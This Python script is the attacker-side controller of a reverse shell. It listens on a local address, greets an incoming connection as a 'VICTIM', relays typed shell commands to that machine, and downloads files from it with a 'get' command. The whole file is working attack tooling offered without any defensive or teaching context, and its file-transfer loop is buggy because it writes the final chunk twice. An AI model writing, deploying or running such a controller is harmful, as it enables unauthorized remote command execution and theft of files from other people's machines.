#!/usr/bin/env python3

import socket
import os

HOST_IP = "192.168.1.205"
PORT= 8080

def getData(connectSocket,command):
    connectSocket.send(command.encode())
    commandString, filename = command.split("*") 
    hold = connectSocket.recv(8192)
    if  "File No Found".encode() in hold:
        print("File No Found")
    else:
        with open(filename,"wb") as fileObject:
            while True: 
               
                fileObject.write(hold)
                if "END".encode() in hold:
                    fileObject.write(hold[:-3]) 
                    print("\nFile Transfed Successfully")
                    break
                hold = connectSocket.recv(8192)
    

def serverconnect():
    socketObject = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socketObject.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    socketObject.bind((HOST_IP,PORT))
    socketObject.listen(1)
    print(f"Listing On Port {HOST_IP}:{PORT} :: WAITING FOR A VICTIM ::")
    connectObject, clientAddr = socketObject.accept()
    print(f"VICTIM is connected << {clientAddr} >>\n")

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            connectObject.send("terminate".encode())
            connectObject.close()
            break
        elif 'get' in command:
            getData(connectObject,command)
        else:
            connectObject.send(command.encode())
            result = connectObject.recv(8192)
            print(result.decode())

if __name__ == "__main__":
    serverconnect()

